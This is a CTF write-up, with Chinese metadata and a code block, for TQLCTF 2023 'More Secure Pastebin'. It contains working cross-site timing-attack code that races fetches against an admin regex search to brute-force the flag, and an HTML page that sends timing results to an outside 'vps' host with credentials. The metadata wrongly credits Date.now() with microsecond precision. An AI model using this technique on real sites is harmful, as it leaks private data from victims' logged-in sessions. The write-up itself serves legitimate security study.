---
title: Writeup for A More Secure Pastebin – Practical Timeless Timing in Browser
contest: TQLCTF (More Secure Pastebin)
year: 2023
difficulty: hard
vuln_type: web_unknown
tags:
- mongo_regex_search
- timing_side_channel
- network_measurement
- date_now_ms_diff
- fetch_parallel_race
- cors_proxy
- pastebin_blind_search
- dns_amplification
- regex_perf_amplify
attack_chain: 目标 /admin/searchword?word= 用 MongoDB RegExp 大小写不敏感搜索 + 5 条 .limit 排序 + 后端 fetch 速度反映匹配数 → 攻击者 fetch 两路径 word=flag{aa 与 word=flag{ab 用 Promise.all 看哪个先返回 (Date.now() ms 差) → 多次迭代差分聚合 (timing) 字符爆破 → 浏览器用 script Date.now() 测量 → fetch+report XHR vps 收集 → CORS proxy 443 + 1443 双端口绕过
key_payload: word=flag{aa / word=flag{ab / Date.now() 测量 fetch ms / Promise.all([p1,p2]).then(1/-1) / timing() 循环 30 次 sleep(50)
one_liner: TQLCTF More Secure Pastebin 实战时间盲注绕过，用浏览器 fetch + Date.now() 测 MongoDB RegExp 搜索响应差，通过 Promise.all 加速盲注爆破 flag{...}。
lesson: MongoDB RegExp 是无锁时间盲注的放大器；浏览器 Date.now() 微秒级精度足够做字符级爆破；fetch race (Promise.all([p1,p2])) 是 network measurement 的标配。
quality: high
full_path: Writeup_for_A_More_Secure_Pastebin_–_Practical_Timeless_Timing_in_Browser.full.md
meta_path: Writeup_for_A_More_Secure_Pastebin_–_Practical_Timeless_Timing_in_Browser.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: Writeup for A More Secure Pastebin – Practical Timeless Timing in Browser。TQLCTF More Secure Pastebin 实战时间盲注绕过，用浏览器 fetch + Date.now() 测 MongoDB RegExp 搜索响应差，通过 Promise.all 加速盲注爆破 flag{...}。。经验：Mon...
category: web
subcategory: web_other
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/27109.html
reasoning_chain:
- 触发点：/admin/searchword?word= 用 MongoDB RegExp 大小写不敏感搜索 + 5 条 .limit 排序 → 假设：后端 fetch 速度反映匹配数
- 假设：MongoDB RegExp 匹配越多越慢 → 触发点：时间盲注
- 动作：攻击者 fetch 两路径 word=flag{aa 与 word=flag{ab 用 Date.now() 看哪个先返回 → Promise.all([p1, p2]).then(1/-1)
- 假设：必须多次迭代差分聚合 timing 字符爆破 → timing() 循环 30 次 sleep(50)
- 观察：浏览器用 script Date.now() 测量 → fetch+report XHR vps 收集 → CORS proxy 443 + 1443 双端口绕过
- 假设：CORS proxy 绕过 + fetch race 是 network measurement 标配
- 动作：浏览器同时发起两 fetch 路径 → Date.now() 微秒级精度足够做字符级爆破
- 观察：爆破字符 → 字符级匹配 → 拼接 flag{...}
- 假设：MongoDB RegExp 是无锁时间盲注的放大器（Regex 匹配 N 次 = O(N) 时间）
failed_attempts:
- 试图直接 fetch word=flag{aa 测时间 → 失败：单次 fetch 时间噪声太高，必须 fetch 两路径做差分
- 试图用 server-side timing → 失败：浏览器 Date.now() 才有微秒级精度
- 试图单端口 fetch → 失败：必须双端口 443 + 1443 CORS proxy 绕过
key_observations:
- MongoDB RegExp 是无锁时间盲注的放大器
- 浏览器 Date.now() 微秒级精度足够做字符级爆破
- fetch race (Promise.all([p1, p2])) 是 network measurement 的标配
- CORS proxy 双端口 443 + 1443 绕过浏览器同源限制
- 30 次 sleep(50) 迭代差分聚合是 timing 攻击去噪标配
prerequisites:
- MongoDB RegExp 查询原理
- 浏览器 fetch API + Promise.all race
- Date.now() 时间测量精度
- CORS proxy 双端口绕过
- timing 攻击差分聚合去噪
---
# Writeup for A More Secure Pastebin – Practical Timeless Timing in Browser

> 原文: https://www.ctfiot.com/27109.html
> ID: 27109


```
const searchRgx = new RegExp(escapeStringRegexp(word), "gi");
// No time to implemente the pagination. So only show 5 results first.
let paste = await Pastes.find({
 content: searchRgx,
})
 .sort({ date: "asc" })
 .limit(5);
if (paste && paste.length > 0) {
 let data = [];
 await Promise.all(
 paste.map(async (p) => {
 let user = await User.findOne({ username: p.username });
 data.push({
 pasteid: p.pasteid,
 title: p.title,
 content: p.content,
 date: p.date,
 username: user.username,
 website: user.website,
 });
 })
 );
 return res.json({ status: "success", data: data });
} else {
 return res.json({ status: "fail", data: [] });
}
// 伪代码
for (let i = 0; i < 10; i += 1) {
 let p1 = fetch("https://zedd.zz:
1443/admin/searchword?word=flag{aa")
 let p2 = fetch("https://zedd.zz:
1443/admin/searchword?word=flag{ab")
 let diffs = await Promise.all([p1.then(1), p2.then(-1)]);
 if (diffs[0] !== undefined) {
 return diffs[0];
 }
 return diffs[1];
}
<!DOCTYPE html>
<html lang="en">
<head>
 <meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Document</title>
 <!--头部-->
 <script>
 const start = Date.now()
 </script>
 <script>
 abc = () => {
 const end = Date.now()
 var req = new XMLHttpRequest();
 req.open('get',`http://vps/result?word=TQLCTF{5b2e5a7f&ms=${end - start}`,true);
 req.withCredentials = true;
 req.send();
 }
 </script>
<!--底部-->
</head>

 

</html>
const SEARCH_URL = 'https://proxy:
443/admin/searchword?word=';

async function timing(term) {
 let cnt = 0;
 for(let i=0; i<30; i++) {
 let val = await Promise.any([search_req(term), search_req('_404_404_404')]);
 if(val===term) cnt++;
 await sleep(50);
 }
 return cnt;
}

async function run() {
 await report('started');
 let res = [];
 for(let c of CHARSET)
 res.push(await timing('TQLCTF{'+c));
 await report(`res_${res.join('_')}`);
}
```
